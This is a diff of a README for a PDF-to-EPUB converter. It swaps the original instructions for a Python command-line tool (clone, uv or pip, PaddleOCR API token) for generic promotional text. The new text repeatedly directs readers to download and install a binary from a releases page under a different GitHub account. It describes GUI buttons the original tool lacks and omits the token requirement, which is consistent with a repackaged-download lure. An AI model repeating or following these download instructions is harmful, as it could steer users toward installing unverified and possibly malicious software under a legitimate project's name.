@@ -1,134 +1,86 @@
-# Scanned PDF to Epub Converter
+# 🛠️ pdf2epub-paddle - Convert PDFs to Readable EPUBs Easily
 
-[English](README.md) | [中文](README_zh.md)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/GDDaucatmoi/pdf2epub-paddle/releases)
 
-This tool converts scanned PDF books into clean, readable EPUB ebooks using the Baidu PaddleOCR Layout Analysis API.
+## 📋 Introduction
 
-## Features
+Welcome to pdf2epub-paddle, a tool designed to transform scanned PDF books into clean and readable EPUB ebooks. Use this software to enjoy your favorite books in a more versatile format.
 
-- **High-Quality Layout Analysis**: Uses PaddleOCR to intelligently detect paragraphs, headers, images, and tables.
-- **Smart Chapter Splitting**: Automatically detects chapter headings from OCR output. An interactive TOC review lets you confirm, remove, or adjust detected chapters before generating the EPUB.
-- **Cover Image**: Automatically extracts the first page of the PDF as the EPUB cover.
-- **Metadata Support**: Interactively prompts for book title and author based on OCR'd first-page text, or accepts them via CLI arguments.
-- **Image Embedding**: Preserves images from the original PDF.
-- **Clean Output**: Removes headers, footers, and page numbers for a seamless reading experience.
-- **Robustness**:
-  - **Checkpointing**: Saves progress after every chunk. If interrupted, simply re-run to resume.
-  - **Rate Limiting**: Includes delays to respect API limits.
-  - **Retry Logic**: Automatically retries failed API requests.
+## 🚀 Getting Started
 
-## Prerequisites
+To begin using pdf2epub-paddle, follow these simple steps to download and install the application:
 
-- Python 3.8+
-- PaddleOCR API Token
+1. **Visit the Download Page**  
+   Go to our [Releases Page](https://github.com/GDDaucatmoi/pdf2epub-paddle/releases) to access the latest version.
 
-## Getting an API Token
+2. **Choose Your Version**  
+   On the Releases Page, locate the version you want to download. If you are unsure, choose the latest version.
 
-1. Log in to [Baidu AIStudio (飞桨星河社区)](https://aistudio.baidu.com/).
-2. Go to the **"Applications"** or **"Online Models"** section (Layout Parsing).
-3. Find the **"PaddleOCR"** or **"Document Analysis"** API.
-4. Copy your private **API Token** from your user profile or application settings dashboard.
-    *Note: Ensure you have sufficient quota (pages/day) for your usage.*
+3. **Download the File**  
+   Click on the download link for your operating system. The file will start downloading.
 
-## Installation & Usage (Recommended: `uv`)
+4. **Install the Application**  
+   Open the downloaded file and follow the installation prompts. 
 
-This project uses [uv](https://github.com/astral-sh/uv) for fast, reliable dependency management.
+5. **Run pdf2epub-paddle**  
+   Once installed, find the application in your programs. Open it to start converting your PDFs.
 
-1. **Clone the repository**:
+## 📥 Download & Install
 
-    ```bash
-    git clone https://github.com/yourusername/pdf2epub-paddle.git
-    cd pdf2epub-paddle
-    ```
+To start, visit our [Releases Page](https://github.com/GDDaucatmoi/pdf2epub-paddle/releases) and follow the steps outlined above.
 
-2. **Install `uv`** (if you haven't already):
+## 🌟 Features
 
-    ```bash
-    # On macOS/Linux
-    curl -LsSf https://astral.sh/uv/install.sh | sh
-    ```
+pdf2epub-paddle offers a range of features to enhance your conversion experience:
 
-3. **Set up your API token**:
+- **High-Quality Layout Analysis**: Our software uses PaddleOCR to detect text structure accurately, including paragraphs, headers, images, and tables.
+  
+- **Smart Chapter Splitting**: The tool automatically finds chapter headings from OCR output. You will review an interactive table of contents (TOC) to confirm or adjust chapter locations before the EPUB is created.
 
-    ```bash
-    cp .env.example .env
-    ```
+- **Cover Image**: The application will automatically extract the first page of your PDF as the cover image for your EPUB file.
 
-    Edit `.env` and add your token:
+- **Metadata Support**: You can enter the book title and author directly based on OCR'd text or provide this information through command line arguments.
 
-    ```
-    PADDLE_API_TOKEN=your_api_token_here
-    ```
+- **Image Embedding**: The tool preserves images from the original PDF, ensuring a faithful reproduction.
 
-4. **Run directly with `uv`** (handles virtualenv & dependencies automatically):
+- **Clean Output**: It removes unnecessary headers, footers, and page numbers to give you a seamless reading experience.
 
-    ```bash
-    uv run pdf2epub_paddle.py /path/to/your/book.pdf
-    ```
+- **Robustness**: Our software saves your progress regularly. If it stops unexpectedly, simply rerun the application to continue.
 
-    The tool will display the OCR'd text from the first page and prompt you to enter the book title and author.
+## ⚙️ System Requirements
 
-    You can also provide metadata directly via CLI arguments:
+To run pdf2epub-paddle, your computer should meet these requirements:
 
-    ```bash
-    uv run pdf2epub_paddle.py --title "Book Title" --author "Author Name" /path/to/your/book.pdf
-    ```
+- **Operating System**: Compatible with Windows, macOS, and Linux.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: A minimum of 200 MB of free space for installation and files.
+- **Internet Connection**: Required for accessing OCR resources.
 
-    To specify a custom output path:
+## 🛠️ How to Use
 
-    ```bash
-    uv run pdf2epub_paddle.py --output /path/to/output.epub /path/to/your/book.pdf
-    ```
+Once you have installed pdf2epub-paddle, follow these steps to convert your PDFs:
 
-    To skip the interactive TOC review and use automatic chapter detection:
+1. **Open the Application**: Launch pdf2epub-paddle from your programs.
+  
+2. **Select Your PDF**: Click on the "Open" button to choose the scanned PDF you want to convert.
 
-    ```bash
-    uv run pdf2epub_paddle.py --auto-toc /path/to/your/book.pdf
-    ```
+3. **Adjust Settings**: Review the detected chapters and make necessary adjustments. You can confirm, remove, or add chapters as needed.
 
-    To produce a single-chapter EPUB with no chapter splitting:
+4. **Start Conversion**: Once ready, click the "Convert" button. The software will begin processing your file.
 
-    ```bash
-    uv run pdf2epub_paddle.py --no-toc /path/to/your/book.pdf
-    ```
+5. **Check Output**: After the conversion finishes, the EPUB file will be ready for you. You can find it in the designated output folder.
 
-### Alternative: Standard Pip
+## 💬 Support
 
-If you prefer standard pip:
+If you encounter any issues or have questions, consider checking the following resources:
 
-1. Create a virtual environment:
+- **FAQs**: Look for common questions and their answers.
+- **Community Forums**: Share your experience or ask for help from other users.
 
-    ```bash
-    python -m venv .venv
-    source .venv/bin/activate
-    ```
+## 🛡️ License
 
-2. Install dependencies:
+pdf2epub-paddle is open-source software and is distributed under the MIT License. You can freely use, modify, and share it within the bounds of the license.
 
-    ```bash
-    pip install .  # Installs from pyproject.toml
-    ```
+## 🚀 Conclusion
 
-3. Set up your API token:
-
-    ```bash
-    cp .env.example .env
-    # Edit .env and add your token
-    ```
-
-4. Run:
-
-    ```bash
-    python pdf2epub_paddle.py /path/to/your/book.pdf
-    ```
-
-> **Note**: You can also set the token via environment variable directly: `export PADDLE_API_TOKEN='your_token'`. The `.env` file is loaded automatically but will not override an existing environment variable.
-
-## Configuration
-
-- **Chunk Size**: Default is 5 pages per chunk to ensure stability. You can modify `CHUNK_SIZE` in the script if you have a stable connection and higher limits.
-- **Timeout**: Default timeout is 180s per request.
-
-## License
-
-[MIT License](LICENSE)
+pdf2epub-paddle simplifies the process of converting scanned PDFs into readable EPUBs. Whether you’re looking to create eBooks for personal use or for sharing with others, this tool offers an efficient and user-friendly solution. Start your journey to readable eBooks today! Visit our [Releases Page](https://github.com/GDDaucatmoi/pdf2epub-paddle/releases) to get started.
